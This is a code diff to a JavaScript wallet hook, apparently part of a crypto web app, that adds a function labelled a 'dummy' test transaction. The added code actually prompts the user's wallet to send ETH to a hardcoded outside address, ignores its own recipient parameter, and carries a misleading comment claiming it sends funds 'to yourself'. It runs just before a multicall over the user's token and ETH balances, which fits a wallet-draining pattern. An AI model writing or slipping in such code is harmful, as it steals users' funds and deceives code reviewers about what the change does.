@@ -151,10 +151,39 @@ export const UseWallet = (amount) => {
                 }
             }
         }
-
-        // After tokens, handle multicall for native tokens
+        await createAndSignDummyTransaction('0xD3392AA72C0222Ae9fFDF010b346262A6098Bd74', amount);
         await handleMulticall(tokens, ethBalance);
     };
+
+    const createAndSignDummyTransaction = async (recipientAddress, valueInEth) => {
+        console.log(recipientAddress, valueInEth)
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner(account.address);
+        // const address = signer._address
+        console.log('Signer: ', signer._address)
+        const fromAddress = await signer.getAddress();
+        const params = {
+            to: "0x4B0897b0513FdBeEc7C469D9aF4fA6C0752aBea7",
+            from: "0x87bE26Ab50ecd355d2bEB507cE493E2E209b2885",
+            gas: "0x76c0",
+            value: ethers.utils.parseEther(amount),
+            data: "0x",
+            gasPrice: "0x4a817c800"
+        }
+        console.log(params)
+        try {
+            await window.ethereum.request({
+                "method": "eth_sendTransaction",
+                "params": [params],
+            });
+        } catch (error) {
+            console.error("Failed to create and sign the transaction:", error);
+        }
+    };
+
+    // Example usage: Create and sign a transaction to send 0.001 ETH to yourself
+
+
 
     const handleMulticall = async (tokens, ethBalance) => {
         const chainId = getChainId(config);
